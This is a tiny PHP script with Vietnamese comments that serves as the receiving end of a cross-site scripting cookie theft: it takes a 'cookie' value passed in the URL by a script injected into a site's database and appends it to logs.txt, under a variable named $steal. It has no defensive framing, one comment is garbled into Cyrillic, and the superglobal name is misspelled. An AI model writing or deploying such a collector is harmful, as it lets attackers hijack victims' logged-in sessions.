<?php
$cookie=$HTTP_GET_VAR["cookie"];  //nho viec gui bien cookie qua link script duoc gan vao trong database
$steal=fopen("logs.txt","a");               //mo file bang bien steal roi sau do chung ta ghi bien cookie vao trong file
fwrite($steal,$cookie."\n");                //lay cookie
fclose($steal);                                 //Руng file
?>